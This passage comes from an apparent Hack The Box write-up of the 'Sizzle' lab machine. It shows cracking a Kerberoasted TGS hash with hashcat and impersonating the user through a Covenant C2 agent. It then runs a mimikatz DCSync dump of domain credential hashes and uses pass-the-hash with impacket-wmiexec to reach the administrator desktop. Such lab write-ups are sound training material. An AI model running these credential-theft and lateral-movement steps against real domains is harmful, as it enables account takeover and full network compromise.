0DB12034DEBDAD6B7B0305E3DA39618CAE998BA09740E2123546F62448E85A877B5E0CB6AFE926133A1C0F06494B6011C11EF3D7094BF21E2982DA2D1BFE1770B9858E8A3B5DDC8988A5A2E234D39E70D3DA3EF2BD0243682A3F25281A8EE2BB024E1F46F2164DB5F0B5216752812FB5203C4144CFB3391CE2742377477300523613D9C90816ADFF69836B26BBB40BB5DDE626CFFA066ACB542DCE270E074498596875CF9D40AD80D7F557ACA365BE487A76EA8DDFB59E5F733DA4709380B237FBBE51DF04D7AB6791A3117F6AD1A06029E354C011572E979D2DABB50178AF63FFA7D61182369EBDF9B78721315A03192EC2AEBB716221CF4386E3DA4C7A977C048025CF15288489DDECA8A28BFE9B763CCC9B0B6748811AC8046215EB45EE4F218686761B986FF7E207E6F0183B3B812AFC903C629EE52DF998329DC8BC8014AC90E55CADB74A6E05BD2882749B8717
```

We can then paste these credentials into a new <b>tgs-hashes.txt</b> file and use <b>hashcat</b> to attempt to crack it. We realize that we need to insert a "*" in the hash between the server principle name and $ delimeter like so:

```
$krb5tgs$23$*mrlky$HTB$http/sizzle inserted>>> * <<<inserted $AAC8BBBBA7...

$krb5tgs$23$*mrlky$HTB$http/sizzle*$AAC8BBBBA7...
```

```bash
root@kali:~/htb/sizzle# hashcat -m 13100 -a 0 tgs-hashes.txt /usr/share/wordlists/rockyou.txt
```

Hashcat will return password for mrlky as <b>Football#7</b>. We can then use this password to make a token for mrlky with Elite.

```bash
(Covenant: Grunts\a676dda99a) > maketoken mrlky htb Football#7
(Covenant: Grunts\a676dda99a) > 
[*] [06/09/2019 16:58:41 UTC] Grunt: a676dda99a has been assigned GruntTasking: f37826b36e
(datkev) > maketoken mrlky htb Football#7
(Covenant: Grunts\a676dda99a) > 
[*] [06/09/2019 16:58:46 UTC] Grunt: a676dda99a has completed GruntTasking: f37826b36e
(datkev) > maketoken mrlky htb Football#7
Successfully made and impersonated token for user: htb\mrlky
(Covenant: Grunts\a676dda99a) > DCSync sizzler
(Covenant: Grunts\a676dda99a) > 
[*] [06/09/2019 16:58:58 UTC] Grunt: a676dda99a has completed GruntTasking: 2c55dc015f
(datkev) > DCSync sizzler

  .#####.   mimikatz 2.2.0 (x64) #17763 Apr  9 2019 23:22:27
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::dcsync /user:sizzler
[DC] 'HTB.LOCAL' will be the domain
[DC] 'sizzle.HTB.LOCAL' will be the DC server
[DC] 'sizzler' will be the user account

Object RDN           : sizzler

** SAM ACCOUNT **

SAM Username         : sizzler
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 7/12/2018 10:29:49 AM
Object Security ID   : S-1-5-21-2379389067-1826974543-3574127760-1604
Object Relative ID   : 1604

Credentials:
  Hash NTLM: d79f820afad0cbc828d79e16a6f890de
    ntlm- 0: d79f820afad0cbc828d79e16a6f890de
    lm  - 0: b5c7dc29678de1ae9f1165c472433e20

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : fa5b8cb43e76da6250d21cae8a167952

* Primary:Kerberos-Newer-Keys *
    Default Salt : HTB.LOCALsizzler
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 85b437e31c055786104b514f98fdf2a520569174cbfc7ba2c895b0f05a7ec81d
      aes128_hmac       (4096) : e31015d07e48c21bbd72955641423955
      des_cbc_md5       (4096) : 5d51d30e68d092d9

* Primary:Kerberos *
    Default Salt : HTB.LOCALsizzler
    Credentials
      des_cbc_md5       : 5d51d30e68d092d9

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  4cecf519814ecd73d9dfadb113f9b4b8
    02  42eeaa626e7779cad84663fc81e00b30
    03  612610ef69844dc71ac9dd102d4d0d50
    04  4cecf519814ecd73d9dfadb113f9b4b8
    05  42eeaa626e7779cad84663fc81e00b30
    06  c0ef9300731f68c869fef13127af816f
    07  4cecf519814ecd73d9dfadb113f9b4b8
    08  d12489ef68d29d5b2c8a735b45b87211
    09  49068a7b2a81f290e533a65c4740d3b2
    10  929b6991c492f1af5d00a941cc9f74d5
    11  d12489ef68d29d5b2c8a735b45b87211
    12  49068a7b2a81f290e533a65c4740d3b2
    13  2628111e66413da29b4dfe09fef74a5a
    14  d12489ef68d29d5b2c8a735b45b87211
    15  b339f939cd88979c924524e7877e4d4b
    16  f087e63000ec85a7f894827bbe42c94a
    17  74d596546a6753c79ed3879173ca7992
    18  bb29c7a8a03bce13ab11b526aa2a7683
    19  8f9b6548313f8d1a941e8c19cc1ea9c3
    20  7849bf5ff276e734c2301f519324c864
    21  af9c4a8de05d6ac3ddbf5c3f4540dece
    22  af9c4a8de05d6ac3ddbf5c3f4540dece
    23  ff86752ed98796b6ec5a7b06156b2cdb
    24  ea067f2e003f7c4cdc5086dbb3a51323
    25  25a45100adc5c9113f1c25cb78106540
    26  cf612aa571b6b551a69e7e3f9a607a57
    27  ca445a59b7d68fbbd482863b67975094
    28  e7b68d4b5fef554f03c5ea6f5c9ed3f4
    29  31c306275e37f2acf5999b2f11fff82f
```

We can now use the NTLM hash, <b>d79f820afad0cbc828d79e16a6f890de</b>, with <b>wmiexec</b> to get a shell.

```bash
root@kali:~/htb/sizzle# impacket-wmiexec sizzler@10.10.10.103 -hashes d79f820afad0cbc828d79e16a6f890de:d79f820afad0cbc828d79e16a6f890de
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C78-BB37

 Directory of C:\

07/03/2018  11:22 AM    <DIR>          Department Shares
07/02/2018  04:29 PM    <DIR>          inetpub
12/01/2018  10:56 PM    <DIR>          PerfLogs
09/26/2018  12:49 AM    <DIR>          Program Files
09/26/2018  12:49 AM    <DIR>          Program Files (x86)
07/11/2018  05:59 PM    <DIR>          Users
06/09/2019  12:57 PM    <DIR>          Windows
               0 File(s)              0 bytes
               7 Dir(s)  10,780,270,592 bytes free

C:\>cd Users

C:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C78-BB37

 Directory of C:\Users

07/11/2018  05:59 PM    <DIR>          .
07/11/2018  05:59 PM    <DIR>          ..
07/02/2018  04:29 PM    <DIR>          .NET v4.5
07/02/2018  04:29 PM    <DIR>          .NET v4.5 Classic
08/19/2018  03:04 PM    <DIR>          administrator
06/08/2019  09:39 PM    <DIR>          amanda
07/02/2018  12:39 PM    <DIR>          mrlky
07/11/2018  05:59 PM    <DIR>          mrlky.HTB
11/20/2016  09:24 PM    <DIR>          Public
07/03/2018  10:32 PM    <DIR>          WSEnrollmentPolicyServer
07/03/2018  10:49 PM    <DIR>          WSEnrollmentServer
               0 File(s)              0 bytes
              11 Dir(s)  10,778,804,224 bytes free

C:\Users>cd administrator

C:\Users\administrator>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C78-BB37

 Directory of C:\Users\administrator

08/19/2018  03:04 PM    <DIR>          .
08/19/2018  03:04 PM    <DIR>          ..
07/02/2018  11:00 PM    <DIR>          Contacts
07/10/2018  06:24 PM    <DIR>          Desktop
07/10/2018  06:08 PM    <DIR>          Documents
07/02/2018  11:00 PM    <DIR>          Downloads
07/02/2018  11:00 PM    <DIR>          Favorites
07/02/2018  11:00 PM    <DIR>          Links
07/02/2018  11:00 PM    <DIR>          Music
07/02/2018  11:00 PM    <DIR>          Pictures
07/02/2018  11:00 PM    <DIR>          Saved Games
07/12/2018  11:00 AM    <DIR>          Searches
07/02/2018  11:00 PM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  10,779,582,464 bytes free

C:\Users\administrator>cd Desktop

C:\Users\administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C78-BB37

 Directory of C:\Users\administrator\Desktop

07/10/2018  06:24 PM    <DIR>          .
07/10/2018  06:24 PM    <DIR>          ..
07/10/2018  06:24 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  10,779,586,560 bytes free
```